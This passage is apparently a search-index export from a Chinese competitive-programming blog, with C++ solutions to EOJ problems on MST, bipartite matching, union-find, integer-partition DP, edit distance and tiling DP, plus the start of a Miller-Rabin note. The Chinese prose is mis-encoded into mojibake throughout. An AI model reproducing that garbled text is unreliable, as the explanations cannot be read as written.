‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3458 Cards Game æ¯æ¬¡ä» N å¼ ç‰Œä¸­é€‰æ‹©ä¸¤å¼ ï¼Œä»£ä»·ä¸º min(r[i]^b[j], r[j]^b[i]), ç„¶åä»ä¸¤å¼ ä¸­é€‰æ‹©ä¸€å¼ åˆ å»è¿›å…¥ä¸‹ä¸€è½®ï¼Œå¾ªç¯ç›´è‡³åªå‰©ä¸€å¼ ç‰Œï¼Œæ±‚æœ€å°ä»£ä»·å’Œã€‚ æ¥è‡ª Google Kickstart Round G 2017 çš„ B é¢˜ã€‚MST çš„å¥‡æ€ªç”¨æ³•ã€‚ å¯ä»¥å‘ç°æœ‰ N å¼ ç‰Œï¼ŒN-1 æ¬¡æ“ä½œã€‚åœ¨æ‰”æ‰çš„ç‰Œä¸ç•™ä¸‹çš„ç‰Œä¹‹é—´è¿è¾¹ï¼Œåˆ™è¾¹çš„æƒå€¼ == é¢˜ç›®ä¸­çš„ä»£ä»·ã€‚è¿™æ ·æ±‚æœ€å°ä»£ä»·å’Œå°±è½¬åŒ–æˆæ±‚å›¾çš„æœ€å°ç”Ÿæˆæ ‘é—®é¢˜ï¼ŒPrim æˆ–è€… Kruskalï¼ˆå¦‚ä¸‹ä»£ç ï¼‰ç›´æ¥è¿‡ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int N = 101; int r[N], b[N]; int fa[N]; int union_find(int x) { return fa[x] == x ? x : fa[x] = union_find(fa[x]); } bool unite(int a, int b) { a = union_find(a); b = union_find(b); if (a != b) { fa[a] = b; return 1; } return 0; } vector\u003ctuple\u003cint, int, int\u003e \u003e v; ll kruskal() { sort(v.begin(), v.end()); ll ans = 0; for (auto i : v) { int u, v, w; tie(w, u, v) = i; if (unite(u, v)) ans += w; } return ans; } int main() { int cas, n, i; cin \u003e\u003e cas; for (int t = 1; t \u003c= cas; ++t) { cin \u003e\u003e n; v.clear(); for (i = 0; i \u003c n; ++i) cin \u003e\u003e r[i]; for (i = 0; i \u003c n; ++i) cin \u003e\u003e b[i]; for (i = 0; i \u003c n; ++i) { for (int j = i+1; j \u003c n; ++j) v.emplace_back(min(r[i]^b[j], r[j]^b[i]), i, j); fa[i] = i; } printf(\"Case #%d: %lld\\n\", t, kruskal()); } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:8:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ2069 Asteroids NÃ—N ç½‘æ ¼ä¸­æœ‰è‹¥å¹²ä¸ªå°è¡Œæ˜Ÿï¼Œæ­¦å™¨æ¯æ¬¡å‘å°„å¯ä»¥æ¸…é™¤ä¸€è¡Œæˆ–ä¸€åˆ—ï¼Œé—®æœ€å°‘éœ€è¦å‘å°„å¤šå°‘æ¬¡æ‰èƒ½æ¸…é™¤å…¨éƒ¨å°è¡Œæ˜Ÿã€‚ æ‰€æœ‰å°è¡Œæ˜Ÿæ¨ªåæ ‡ä¸ºä¸€ä¸ªç‚¹é›†ï¼Œçºµåæ ‡ä¸ºå¦ä¸€ä¸ªç‚¹é›†ã€‚å¯¹äºæ¯ä¸ªå°è¡Œæ˜Ÿï¼Œåœ¨å…¶æ¨ªåæ ‡ä¸çºµåæ ‡ä¹‹é—´è¿ä¸€æ¡è¾¹ï¼Œåˆ™é—®é¢˜è½¬åŒ–ä¸ºæ±‚äºŒåˆ†å›¾æœ€å°ç‚¹è¦†ç›–ã€‚åˆå› ä¸ºäºŒåˆ†å›¾æœ€å°ç‚¹è¦†ç›– == äºŒåˆ†å›¾æœ€å¤§åŒ¹é…ï¼Œæ‰€ä»¥ç›´æ¥è·‘åŒˆç‰™åˆ©å°±è¡Œã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; bool path[505][505], v[505]; int ast[505], n, k; bool dfs(int x) { for (int i = 1; i \u003c= n; ++i) if (!v[i] \u0026\u0026 path[x][i]) { v[i] = 1; if (!ast[i] || dfs(ast[i])) { ast[i] = x; return 1; } } return 0; } int main() { int x, y, ans = 0; cin \u003e\u003e n \u003e\u003e k; while (k--) { scanf(\"%d%d\", \u0026x, \u0026y); path[x][y] = 1; } for (int i = 1; i \u003c= n; ++i) { memset(v, 0, sizeof(v)); if (dfs(i)) ++ans; } printf(\"%d\\n\", ans); return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:9:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3384 é£Ÿç‰©é“¾ åŠ¨ç‰©ç‹å›½ä¸­æœ‰ä¸‰ç±»åŠ¨ç‰© A,B,Cï¼Œè¿™ä¸‰ç±»åŠ¨ç‰©çš„é£Ÿç‰©é“¾æ„æˆäº†æœ‰è¶£çš„ç¯å½¢ã€‚A åƒ Bï¼ŒB åƒ Cï¼ŒC åƒ Aã€‚ ç°æœ‰ N ä¸ªåŠ¨ç‰©ï¼Œä»¥ 1ï¼N ç¼–å·ã€‚æ¯ä¸ªåŠ¨ç‰©éƒ½æ˜¯ A,B,C ä¸­çš„ä¸€ç§ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“å®ƒåˆ°åº•æ˜¯å“ªä¸€ç§ã€‚ æœ‰äººç”¨ä¸¤ç§è¯´æ³•å¯¹è¿™ N ä¸ªåŠ¨ç‰©æ‰€æ„æˆçš„é£Ÿç‰©é“¾å…³ç³»è¿›è¡Œæè¿°ï¼š ç¬¬ä¸€ç§è¯´æ³•æ˜¯ 1 X Yï¼Œè¡¨ç¤º X å’Œ Y æ˜¯åŒç±»ã€‚ ç¬¬äºŒç§è¯´æ³•æ˜¯ 2 X Yï¼Œè¡¨ç¤º X åƒ Yã€‚ æ­¤äººå¯¹ N ä¸ªåŠ¨ç‰©ï¼Œç”¨ä¸Šè¿°ä¸¤ç§è¯´æ³•ï¼Œä¸€å¥æ¥ä¸€å¥åœ°è¯´å‡º K å¥è¯ï¼Œè¿™ K å¥è¯æœ‰çš„æ˜¯çœŸçš„ï¼Œæœ‰çš„æ˜¯å‡çš„ã€‚å½“ä¸€å¥è¯æ»¡è¶³ä¸‹åˆ—ä¸‰æ¡ä¹‹ä¸€æ—¶ï¼Œè¿™å¥è¯å°±æ˜¯å‡è¯ï¼Œå¦åˆ™å°±æ˜¯çœŸè¯ï¼š å½“å‰çš„è¯ä¸å‰é¢çš„æŸäº›çœŸçš„è¯å†²çªï¼Œå°±æ˜¯å‡è¯ï¼› å½“å‰çš„è¯ä¸­ X æˆ– Y æ¯” N å¤§ï¼Œå°±æ˜¯å‡è¯ï¼› å½“å‰çš„è¯è¡¨ç¤º X åƒ Xï¼Œå°±æ˜¯å‡è¯ã€‚ ä½ çš„ä»»åŠ¡æ˜¯æ ¹æ®ç»™å®šçš„ N (1â‰¤Nâ‰¤50 000) å’Œ K å¥è¯ (0â‰¤Kâ‰¤100 000)ï¼Œè¾“å‡ºå‡è¯çš„æ€»æ•°ã€‚ ç»å…¸å¹¶æŸ¥é›†ï¼ˆå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤ªéš¾äº†ï¼‰ã€‚ä»£ç ä¸­ kind æ•°ç»„ä¸º 0 è¡¨ç¤ºä¸çˆ¶èŠ‚ç‚¹åŒç±»ï¼Œ1 è¡¨ç¤ºè¢«çˆ¶èŠ‚ç‚¹åƒï¼Œ2 è¡¨ç¤ºåƒçˆ¶èŠ‚ç‚¹ã€‚ åˆå§‹åŒ–æ—¶ï¼Œæ¯ä¸ªèŠ‚ç‚¹è‡ªèº«æˆä¸ºä¸€ä¸ªé›†åˆï¼Œå¹¶ä¸”çˆ¶èŠ‚ç‚¹ä¹Ÿæ˜¯è‡ªèº«ï¼ˆ0ï¼šåŒç±»ï¼‰ã€‚è·¯å¾„å‹ç¼©çš„æ—¶å€™å¯ä»¥é¡ºä¾¿æ›´æ–°æ‰ kind æ•°ç»„çš„çŠ¶æ€ã€‚ Union å‡½æ•°ä¸­ï¼š å¦‚æœ x,y ä¸åœ¨ä¸€ä¸ªé›†åˆä¸­ï¼Œå…³äºåˆå¹¶ä¹‹å kind è¦æ€ä¹ˆå˜åŒ–ï¼Œè¿™ä¸ªå¼å­æˆ‘çº¯ç²¹é æ‰¾è§„å¾‹å†™äº†ï¼Œå¯èƒ½ç½‘ä¸Šæœ‰æ›´é è°±çš„è§£æ³•ã€‚ å¦‚æœ x,y åŒå±ä¸€ä¸ªé›†åˆï¼Œé‚£ä¹ˆåªéœ€è¦éªŒè¯è¿™å¥è¯æ˜¯ä¸æ˜¯å¯¹çš„å°±å¯ä»¥äº†ã€‚ #include \u003ciostream\u003eusing namespace std; int father[50005], kind[50005]; int Find(int x) { if (x == father[x]) return father[x]; int y = Find(father[x]); kind[x] = (kind[x] + kind[father[x]]) % 3; return father[x] = y; } int Union(int op, int sp1, int sp2) { int x = Find(sp1), y = Find(sp2); if (x == y){ if ((kind[sp1] - kind[sp2] + 3) % 3 == op - 1) return 0; return 1; } father[x] = y; kind[x] = (-kind[sp1] + op - 1 + kind[sp2] + 3) % 3; return 0; } int main() { int n, k, op, sp1, sp2, cnt = 0, i; cin \u003e\u003e n \u003e\u003e k; for (i = 1; i \u003c= n; ++i){ father[i] = i; kind[i] = 0; } for (i = 0;i \u003c k; ++i){ cin \u003e\u003e op \u003e\u003e sp1 \u003e\u003e sp2; if (op == 2 \u0026\u0026 sp1 == sp2) ++cnt; else if (sp1\u003e n || sp2 \u003e n) ++cnt; else cnt += Union(op, sp1, sp2); } cout \u003c\u003c cnt \u003c\u003c endl; return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:10:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"å¯¹æˆ‘è€Œè¨€ä¸é‚£ä¹ˆç®€å•çš„ DP é¢˜ç›®ã€‚ ","date":"2018-01-30","objectID":"/dp-practice/:0:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"1009 æ•´æ•°çš„æ‹†åˆ† å°†æ­£æ•´æ•° n è¡¨ç¤ºæˆä¸€ç³»åˆ—æ­£æ•´æ•°ä¹‹å’Œ : n=n1+n2+â€¦+nkï¼Œå…¶ä¸­ n1â‰¥n2â‰¥â€¦â‰¥nkâ‰¥1(kâ‰¥1) æ­£æ•´æ•° n çš„è¿™ç§è¡¨ç¤ºç§°ä¸ºæ­£æ•´æ•° n çš„æ‹†åˆ†ã€‚æ±‚æ­£æ•´æ•° n çš„ä¸åŒæ‹†åˆ†ä¸ªæ•°ã€‚ ä¾‹å¦‚ï¼Œæ­£æ•´æ•° 6 æœ‰å¦‚ä¸‹ 11 ç§ä¸åŒçš„æ‹†åˆ† : 6ï¼› 5+1ï¼› 4+2ï¼Œ4+1+1ï¼› 3+3ï¼Œ3+2+1ï¼Œ3+1+1+1ï¼› 2+2+2ï¼Œ2+2+1+1ï¼Œ2+1+1+1+1ï¼› 1+1+1+1+1+1ã€‚ ä¾‹å¦‚ï¼Œæ­£æ•´æ•° 3 æœ‰å¦‚ä¸‹ 3 ç§ä¸åŒçš„æ‹†åˆ† : 3; 2+1; 1+1+1ã€‚ ","date":"2018-01-30","objectID":"/dp-practice/:1:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ dp[i][j] è¡¨ç¤ºæ•° i åˆ’åˆ†ä¸º j ä»½çš„æ–¹æ¡ˆæ•°ã€‚æ˜¾ç„¶å¯¹ä»»æ„ iï¼Œæœ‰ dp[i][1]=1ã€‚ å½“ i \u003cj æ—¶ï¼Œä¸ä¼šå‡ºç°æ–°çš„åˆ’åˆ†æ–¹æ¡ˆï¼Œdp[i][j]=dp[i][j-1]; å½“ i == j æ—¶ï¼Œæ–°çš„åˆ’åˆ†æ–¹æ¡ˆåªæœ‰ä¸€ç§ï¼Œé‚£å°±æ˜¯åŸæ•°æœ¬èº«åˆ’ä¸ºä¸€ä»½ï¼ˆå³ dp[i][1]ï¼‰ï¼Œdp[i][j]=dp[i][j-1]+1; å½“ i \u003e j æ—¶ï¼š (1) æ¯ä¸ªåˆ’åˆ†æ•°éƒ½å°äº jï¼Œåˆ™æ€»æ•° dp[i][j-1]; (2) åˆ’åˆ†æ•°ä¸­åŒ…å«äº† jï¼Œåˆ™éœ€è¦ä» i ä¸­å‡å» j å†åˆ’åˆ†ï¼Œæ€»æ•° dp[i-j][j]; æ‰€ä»¥çŠ¶æ€è½¬ç§»æ–¹ç¨‹ dp[i][j]=dp[i][j-1]+dp[i-j][j]ã€‚ #include \u003ccstdio\u003eusing namespace std; int dp[101][101]; int main(void) { int n, i, j; for (i = 1; i \u003c= 100; ++i) dp[i][1] = 1; while(~scanf(\"%d\", \u0026n)){ for (i = 1; i \u003c= n; ++i) for (j = 2; j \u003c= n; ++j){ dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i\u003e j) dp[i][j] += dp[i - j][j]; } printf(\"%d\\n\", dp[n][n]); } return 0; } ","date":"2018-01-30","objectID":"/dp-practice/:1:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"3034 æ•°å­—æ‹†åˆ† å°†ä¸€ä¸ªæ­£æ•´æ•°æ‹†åˆ†ä¸ºæˆ 2 çš„å¹‚çš„å’Œï¼Œä¾‹å¦‚ï¼š 7=1+2+4 7=1+2+2+2 7=1+1+1+4 7=1+1+1+2+2 7=1+1+1+1+1+2 7=1+1+1+1+1+1+1 æ€»å…±æœ‰å…­ç§ä¸åŒçš„æ‹†åˆ†æ–¹æ¡ˆã€‚ å†æ¯”å¦‚ï¼š4 å¯ä»¥æ‹†åˆ†æˆï¼š4 = 4ï¼Œ4 = 1 + 1 + 1 + 1ï¼Œ4 = 2 + 2ï¼Œ4 = 1 + 1 + 2ã€‚ å‡½æ•° f(n) è¡¨ç¤º n çš„ä¸åŒæ‹†åˆ†çš„æ–¹æ¡ˆæ•°ï¼Œä¾‹å¦‚ f(7)=6ã€‚ è¯·ç¼–å†™ç¨‹åºï¼Œè¯»å…¥ä¸€ä¸ªæ­£æ•´æ•° n (1â‰¤nâ‰¤1000000)ï¼Œè¾“å‡º f(n)%1000000000ã€‚ ","date":"2018-01-30","objectID":"/dp-practice/:2:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ å¦‚æœ n ä¸ºå¥‡æ•°ï¼Œé‚£ä¹ˆæ¯ç§åˆ’åˆ†åªä¼šç›¸å¯¹äºå‰ä¸€ä¸ªå¶æ•°çš„åˆ’åˆ†å„å¤šå‡ºä¸€ä¸ª 1ï¼Œå› æ­¤åˆ’åˆ†æ•°ç›¸ç­‰ï¼Œdp[n]=dp[n-1]ã€‚ å¦‚æœ n ä¸ºå¶æ•°ï¼Œé‚£ä¹ˆå¯¹äºå«æœ‰ 1 çš„æƒ…å†µå¯ä»¥æ‹¿å‡º 2 ä¸ª 1 è½¬åŒ–ä¸º n-2 çš„æƒ…å†µï¼Œè€Œå¯¹ä¸å« 1 çš„æƒ…å†µå¯ä»¥ç›´æ¥é™¤ä»¥ 2 å˜æˆ n/2 çš„æƒ…å†µï¼Œdp[n]=dp[n-2]+dp[n\u003e\u003e1]ã€‚ #include \u003ccstdio\u003e#define MAX 1000000 #define mod 1000000000 int dp[1000001] = {0, 1, 2}; int main() { int cas, n; scanf(\"%d\", \u0026cas); for (int i = 3; i \u003c= 1000000; ++i){ if (i \u0026 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i\u003e\u003e1]) % mod; } for (int t = 0; t \u003c cas; ++t){ scanf(\"%d\", \u0026n); printf(\"case #%d:\\n%d\\n\", t, dp[n]); } return 0; } ","date":"2018-01-30","objectID":"/dp-practice/:2:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"3029 ä¸é‡å¤æ­£æ•´æ•° æ•´æ•°æ‹†åˆ†æ˜¯æŠŠä¸€ä¸ªæ­£æ•´æ•°ï¼ˆç®€ç§°ä¸ºå’Œæ•°ï¼‰æ‹†åˆ†ä¸ºä¸€ä¸ªæˆ–è‹¥å¹²ä¸ªæŒ‡å®šæ­£æ•´æ•°ï¼ˆç®€ç§°ä¸ºé›¶æ•°ï¼Œé€šå¸¸ä¸åŒºåˆ«å¼ä¸­å„é›¶æ•°çš„æ’åˆ—é¡ºåºï¼‰ä¹‹å’Œï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„è®¡ç®—é—®é¢˜ã€‚é€šå¸¸æ‹†åˆ†å¼ä¸­çš„é›¶æ•°æœ‰é‡å¤å’Œä¸é‡å¤ï¼ˆå³æ‹†åˆ†å¼ä¸­å„é›¶æ•°äº’ä¸ç›¸åŒï¼‰ä¸¤ç§æƒ…å†µã€‚ å¦‚æœæˆ‘ä»¬æ‰“ç®—å°†ä¸€ä¸ªç»™å®šçš„æ­£æ•´æ•° Nï¼ˆNâ‰¤50ï¼‰æ‹†åˆ†ä¸ºè‹¥å¹²ä¸ªä¸é‡å¤çš„æ­£æ•´æ•°ï¼ˆa1,a2,â€¦,ai,â€¦ï¼‰ï¼ˆiâ‰¥1ï¼‰ä¹‹å’Œï¼Œå…¶ä¸­æ¯ä¸ªé›¶æ•°çš„å–å€¼ä¸å¤§äºç»™å®šçš„æ­£æ•´æ•° Mï¼ˆMâ‰¤20ï¼‰ï¼Œå³ 1â‰¤aiâ‰¤Mï¼Œè¯·é—®å…±æœ‰å¤šå°‘ç§ä¸åŒçš„æ‹†åˆ†æ–¹æ¡ˆã€‚ ","date":"2018-01-30","objectID":"/dp-practice/:3:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ æœ¬è´¨è¿˜æ˜¯ 01 èƒŒåŒ…ï¼Œæ³¨æ„ç¬¬äºŒå±‚å¾ªç¯å€’åºæšä¸¾ï¼Œå¦åˆ™ä¸€ä¸ªæ•°å¯ä»¥å–å¤šæ¬¡ã€‚ æ³¨ï¼šdp[j] += dp[j-i] å…¶å®æ˜¯ dp[j] = max(dp[j], dp[j-i]+dp[j]) çš„ç®€åŒ–å½¢å¼ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; int main() { int cas, n, m, dp[55]; cin \u003e\u003e cas; for (int t = 0; t \u003c cas; ++t) { cin \u003e\u003e n \u003e\u003e m; memset(dp, 0, sizeof(dp)); dp[0] = 1; for (int i = 1; i \u003c= m; ++i) for (int j = n; j\u003e= i; --j) dp[j] += dp[j-i]; printf(\"case #%d:\\n%d\\n\", t, dp[n]); } return 0; } ","date":"2018-01-30","objectID":"/dp-practice/:3:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"2857 ç¼–è¾‘è·ç¦» æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆä»…æœ‰è‹±æ–‡å°å†™å­—æ¯ç»„æˆï¼‰ Aï¼ŒBã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ“ä½œå°† A ä¿®æ”¹æˆ Bã€‚æ“ä½œæœ‰ä¸‰ç§ï¼š1 ä¿®æ”¹ä¸€ä¸ªå­—æ¯ï¼Œ2 åˆ é™¤ä¸€ä¸ªå­—æ¯ï¼Œ3 æ’å…¥ä¸€ä¸ªå­—æ¯ã€‚ç°åœ¨å®šä¹‰ç¼–è¾‘è·ç¦»ä¸ºå°† A é€šè¿‡ä¸Šè¿°æ“ä½œä¿®æ”¹æˆ B çš„æœ€å°‘æ¬¡æ•°ã€‚ ","date":"2018-01-30","objectID":"/dp-practice/:4:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ æœ‰ç‚¹åƒ LCS çš„é¢˜ï¼Œdp[i][j] è¡¨ç¤º a çš„å‰ i ä¸ªå­—ç¬¦è½¬ä¸º b çš„å‰ j ä¸ªå­—ç¬¦æ‰€éœ€è¦çš„æœ€å°‘æ“ä½œæ¬¡æ•°ã€‚ å¦‚æœ a[i-1]==b[j-1] é‚£ä¹ˆä¸éœ€è¦é¢å¤–æ“ä½œï¼Œdp[i][j]=dp[i-1][j-1]; å¦åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ï¼š ä¿®æ”¹ï¼šdp[i][j]=dp[i-1][j-1]+1; å¢åŠ ï¼šdp[i][j]=dp[i][j-1]+1ï¼› åˆ é™¤ï¼šdp[i][j]=dp[i-1][j]+1ã€‚ ä¸‰è€…å– minã€‚ #include \u003ccstdio\u003e#include \u003ccstring\u003e#include \u003calgorithm\u003e#define INF 999999 using namespace std; int main() { int cas, i, j, lena, lenb, dp[501][501]; char a[501], b[501]; scanf(\"%d\\n\", \u0026cas); while(cas--) { gets(a); lena = strlen(a); gets(b); lenb = strlen(b); memset(dp, INF, sizeof(dp)); for (i = 0; i \u003c= lena; ++i) dp[i][0] = i; for (j = 0; j \u003c= lenb; ++j) dp[0][j] = j; for (i = 1; i \u003c= lena; ++i) for (j = 1; j \u003c= lenb; ++j){ dp[i][j] = min(dp[i-1][j] + 1, dp[i][j-1] + 1); dp[i][j] = min(dp[i][j], dp[i-1][j-1] + (a[i-1] != b[j-1])); } printf(\"%d\\n\", dp[lena][lenb]); } return 0; } ","date":"2018-01-30","objectID":"/dp-practice/:4:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"1029 èµ°é“é“ºç – n*m çš„èµ°é“é“ºæ»¡ 1*2 çš„åœ°ç –ï¼Œæ±‚é“ºè®¾æ–¹æ¡ˆæ•°ã€‚ 1 \u003c= N,M \u003c= 11 çŠ¶å‹DPâ€¦â€¦ æˆ‘ä»¬çŸ¥é“è¿™é¢˜ä¸­ä¸Šä¸€è¡Œçš„çŠ¶æ€å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šå†³å®šä¸‹ä¸€è¡Œï¼Œä¸”é“ºä¸€å—ç –çš„æ–¹å¼åªæœ‰ä¸¤ç§ï¼šç«–æ”¾å’Œæ¨ªæ”¾ã€‚ ä¸å¦¨ç”¨ 1 1 è¡¨ç¤ºæ¨ªæ”¾çš„ç –å—ï¼Œä¸Š 0 ä¸‹ 1 æ¥è¡¨ç¤ºç«–æ”¾çš„ç –å—ã€‚ä¸ºä»€ä¹ˆè¿™æ ·è¡¨ç¤ºï¼Ÿ æ¨ªæ”¾ç –å—å¯¹ä¸‹ä¸€è¡Œå®Œå…¨æ²¡æœ‰å½±å“ ç«–æ”¾ç –å—çš„ä¸‹åŠéƒ¨åˆ†å¡«å……äº†ä¸‹ä¸€è¡Œçš„ä¸€ä¸ªæ ¼å­ã€‚ ç«–æ”¾ç –å—çš„ä¸ŠåŠéƒ¨åˆ†å¯¹ä¸‹ä¸€è¡Œæœ‰å½±å“ï¼šå¦‚æœä¸Šä¸€è¡ŒæŸä¸€ä½æ˜¯ 0ï¼Œé‚£ä¹ˆä¸‹ä¸€è¡Œè¿™ä½åªèƒ½æ˜¯ 1ã€‚ ä¸ºäº†ä¿è¯æœ€åä¸€è¡Œæ²¡æœ‰ç«–æ”¾çš„ç –å—ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿è¯æœ€åä¸€è¡Œéƒ½æ˜¯ 1ã€‚ ç”¨ dp[i][j] è¡¨ç¤ºç¬¬ i è¡ŒçŠ¶æ€ä¸º j çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆ dp[n][2^m-1] å°±æ˜¯ç­”æ¡ˆã€‚ ä¹‹åå°±æ˜¯ bottom-up è¿‡ç¨‹äº†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æœ‰è®¸å¤šéæ³•æƒ…å†µéœ€è¦åˆ¤æ–­ã€‚ ä¾‹å¦‚ç¬¬ i è¡Œç¬¬ k ä½å·²ç»æ˜¯ 0ï¼Œé‚£ä¹ˆ i-1 è¡Œå¯¹åº”ä½ä¸€å®šæ˜¯ 1ï¼Œå¦åˆ™éæ³•ã€‚å¦‚æœåˆæ³•ç»§ç»­æ£€æµ‹ (i,k+1)ã€‚ (i,k)=1ï¼Œé‚£ä¹ˆç»§ç»­åˆ†ç±»ï¼š (i-1,k)=0ï¼Œåˆæ³•ï¼Œç»§ç»­æ£€æµ‹ (i,k+1)ã€‚ (i-1,k)=1ï¼Œåˆ™åªå¯èƒ½æ˜¯ (i,k+1)=(i-1,k+1)=1ï¼Œå¦åˆ™éæ³•ã€‚å¦‚æœåˆæ³•ç»§ç»­æ£€æµ‹ (i,k+2)ã€‚ å¯¹äºç¬¬ä¸€è¡Œï¼š (0,k)=0ï¼Œç»§ç»­æ£€æµ‹ (0,k+1)ã€‚ (0,k)=1ï¼Œåˆ™ (0,k+1)=1ï¼Œç»§ç»­æ£€æµ‹ (0,k+2)ã€‚ ä»»æ„éœ€è¦æ£€æµ‹ (0,k+2) ä¸” k==m-1 çš„æƒ…å†µï¼Œéƒ½æ˜¯éæ³•çš„ã€‚ å—¯ï¼Œå°±è¿™ä¹ˆå¤šã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxrow = 11; const int maxstat = 1\u003c\u003c11; int h, w; long long dp[maxrow][maxstat]; inline bool first_ok(int stat) { for (int i = 0; i \u003c w;) if (stat \u0026 (1\u003c\u003ci)) { if (i == w-1 || !(stat \u0026 (1\u003c\u003c(i+1))) ) return 0; i += 2; }else ++i; return 1; } inline bool judge(int a, int b) { for (int i = 0; i \u003c w;) { if (!(a \u0026 (1\u003c\u003ci))) { if (!(b \u0026 (1\u003c\u003ci))) return 0; ++i; }else { if (!(b \u0026 (1\u003c\u003ci))) ++i; else if (i == w-1 || !(( a \u0026 (1\u003c\u003c(i+1)) ) \u0026\u0026 (b \u0026 (1\u003c\u003c(i+1)) ))) return 0; else i += 2; } } return 1; } int main() { while (cin\u003e\u003e h \u003e\u003e w) { if (!h \u0026\u0026 !w) break; if (w\u003e h) swap(w, h); int all = 2 \u003c\u003c(w-1); memset(dp, 0, sizeof dp); for (int i = 0; i \u003c all; ++i) if (first_ok(i)) dp[0][i] = 1; for (int i = 1; i \u003c h; ++i) for (int j = 0; j \u003c all; ++j) for (int k = 0; k \u003c all; ++k) if (judge(j, k)) dp[i][j] += dp[i-1][k]; printf(\"%lld\\n\", dp[h-1][all-1]); } return 0; } ","date":"2018-01-30","objectID":"/dp-practice/:5:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"DP é¢˜ç»ƒä¹ è®°å½•","uri":"/dp-practice/"},{"categories":["ç®—æ³•"],"content":"è´´å®šç†å’Œæ¨¡æ¿çš„ï¼Œä¸æ˜¯æ•™ç¨‹ã€‚ ","date":"2018-01-19","objectID":"/miller-rabin/:0:0","tags":["æ•°å­¦"],"title":"Miller-Rabin ç´ æ€§æµ‹è¯•ä¸äºŒæ¬¡æ¢æµ‹","uri":"/miller-rabin/"},{"categories":["ç®—æ³•"],"content":"ç®—æ³•ç®€ä»‹ é¦–å…ˆæ˜¯ä¸€äº›æ¦‚å¿µï¼š è´¹é©¬å°å®šç†ï¼šå¯¹äºç´ æ•° p å’Œä»»æ„æ•´æ•° aï¼Œæœ‰ $a^p â‰¡ a(mod\\ p)$. åä¹‹ï¼Œå¯¹äºä¸€ä¸ªæ•° pï¼Œå¦‚æœæ»¡è¶³ $a^p â‰¡ a(mod\\ p)$ï¼Œåˆ™ p å¾ˆå¯èƒ½æ˜¯ç´ æ•°ã€‚ ä¼ªç´ æ€§æµ‹è¯•ï¼šççŒœè‹¥å¹²ä¸ª xï¼Œåªè¦ä¸æ»¡è¶³ä¸Šå¼ï¼Œé‚£ä¹ˆ p å°±ä¸æ˜¯ç´ æ•°ã€‚çœ‹èµ·æ¥æ²¡æ¯›ç—…äº†ã€‚ Carmichael æ•°ï¼šå¯¹äºåˆæ•° nï¼Œå¦‚æœå¯¹æ‰€æœ‰æ­£æ•´æ•° bï¼ˆb å’Œ n 